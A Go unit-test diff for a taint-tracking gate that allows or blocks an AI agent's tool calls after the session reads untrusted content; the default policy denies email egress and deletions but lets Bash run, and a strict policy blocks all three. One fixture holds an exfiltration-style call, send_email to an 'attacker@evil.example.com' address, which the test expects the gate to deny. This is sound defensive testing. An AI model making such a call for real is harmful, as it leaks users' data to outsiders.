@@ -305,19 +305,87 @@ func TestConfigureDefaultPolicyUpdatesRegisteredSinkGate(t *testing.T) {
 	}
 }
 
-// TestQuarantinedToSinkBlocked — quarantined-level data (the most restrictive) into
-// a sink is blocked, and the destructive/exec sinks are gated too, not just egress.
+// TestQuarantinedAndOtherSinks — under the REASONABLE DEFAULT gated set, the EGRESS
+// and DESTRUCTIVE channels are gated under taint, but EXEC (Bash) is NOT: gating shell
+// on the session high-water mark would deny normal Bash after any untrusted read. The
+// STRICT set (untrusted-input threat model) gates EXEC too. This is the dev-vs-adversary
+// default split (operator: "defaults should be reasonable; restrictive policies for
+// other use cases").
 func TestQuarantinedAndOtherSinks(t *testing.T) {
 	ctx := context.Background()
 	led := NewLedger()
 	led.Raise("s", abi.TaintQuarantined)
-	sink := NewSinkGate(led, Policy{})
+
+	// Default policy: egress + destructive Deny; EXEC (Bash) Defers (ungated by default).
+	deflt := NewSinkGate(led, Policy{})
+	wantDefault := map[string]abi.VerdictKind{
+		"send_email":         abi.VerdictDeny,  // EGRESS — load-bearing, always gated
+		"delete_reservation": abi.VerdictDeny,  // DESTRUCTIVE — gated by default
+		"Bash":               abi.VerdictDefer, // EXEC — NOT gated by default (dev-safe)
+	}
+	for tool, want := range wantDefault {
+		c := &abi.ToolCall{Tool: tool, TraceID: "s",
+			Args: abi.Ref{Kind: abi.RefInline, Inline: []byte(`{"cmd":"x","to":"a@b.com","id":"1"}`)}}
+		if v := deflt.Adjudicate(ctx, c); v.Kind != want {
+			t.Errorf("default: %s sink under quarantined taint = %v, want %v", tool, v.Kind, want)
+		}
+	}
+
+	// Strict policy: EVERY sensitive sink, including EXEC, Denies under taint.
+	strict := NewSinkGate(led, Policy{GatedSinks: StrictGatedSinks()})
 	for _, tool := range []string{"send_email", "Bash", "delete_reservation"} {
 		c := &abi.ToolCall{Tool: tool, TraceID: "s",
 			Args: abi.Ref{Kind: abi.RefInline, Inline: []byte(`{"cmd":"x","to":"a@b.com","id":"1"}`)}}
-		if v := sink.Adjudicate(ctx, c); v.Kind != abi.VerdictDeny {
-			t.Errorf("%s sink under quarantined taint must Deny, got %v", tool, v.Kind)
+		if v := strict.Adjudicate(ctx, c); v.Kind != abi.VerdictDeny {
+			t.Errorf("strict: %s sink under quarantined taint must Deny, got %v", tool, v.Kind)
 		}
+	}
+}
+
+// TestDefaultExemptsExecSink — the dev-experience regression guard: a TAINTED session
+// (the common case after reading any untrusted page / tool result) must NOT block a
+// plain Bash under the default floor. This is the false positive the operator hit
+// (TRUST_VIOLATION/ESCALATE on nearly every dev session). EXEC stays gated only under
+// the strict set or FAK_IFC_GATE_EXEC.
+func TestDefaultExemptsExecSink(t *testing.T) {
+	ctx := context.Background()
+	led := NewLedger()
+	led.Raise("s", abi.TaintTainted) // session has seen untrusted content
+	bash := &abi.ToolCall{Tool: "Bash", TraceID: "s",
+		Args: abi.Ref{Kind: abi.RefInline, Inline: []byte(`{"command":"go build ./..."}`)}}
+
+	if v := NewSinkGate(led, Policy{}).Adjudicate(ctx, bash); v.Kind != abi.VerdictDefer {
+		t.Fatalf("default floor must DEFER a Bash in a tainted session (no dev false positive), got %v/%s",
+			v.Kind, abi.ReasonName(v.Reason))
+	}
+	if v := NewSinkGate(led, Policy{GatedSinks: StrictGatedSinks()}).Adjudicate(ctx, bash); v.Kind != abi.VerdictDeny {
+		t.Fatalf("strict floor must DENY a tainted Bash, got %v", v.Kind)
+	}
+
+	// Egress is still gated by default — the load-bearing anti-exfil property holds.
+	exfil := &abi.ToolCall{Tool: "send_email", TraceID: "s",
+		Args: abi.Ref{Kind: abi.RefInline, Inline: []byte(`{"to":"attacker@evil.example.com"}`)}}
+	if v := NewSinkGate(led, Policy{}).Adjudicate(ctx, exfil); v.Kind != abi.VerdictDeny {
+		t.Fatalf("default floor must still DENY a tainted egress, got %v", v.Kind)
+	}
+}
+
+// TestGatedSetsShape — DefaultGatedSinks gates egress+destructive (not exec by
+// default); StrictGatedSinks gates all three. Guards the documented contract.
+func TestGatedSetsShape(t *testing.T) {
+	def := Policy{}
+	if !def.Gates(SinkEgress) || !def.Gates(SinkDestructive) {
+		t.Fatal("default must gate EGRESS and DESTRUCTIVE")
+	}
+	if def.Gates(SinkExec) != gateExecOnTaint {
+		t.Fatalf("default EXEC gating = %v, want FAK_IFC_GATE_EXEC=%v", def.Gates(SinkExec), gateExecOnTaint)
+	}
+	if def.Gates(SinkNone) {
+		t.Fatal("SinkNone must never be gated")
+	}
+	strict := Policy{GatedSinks: StrictGatedSinks()}
+	if !strict.Gates(SinkEgress) || !strict.Gates(SinkExec) || !strict.Gates(SinkDestructive) {
+		t.Fatal("strict must gate EGRESS, EXEC, and DESTRUCTIVE")
 	}
 }
 
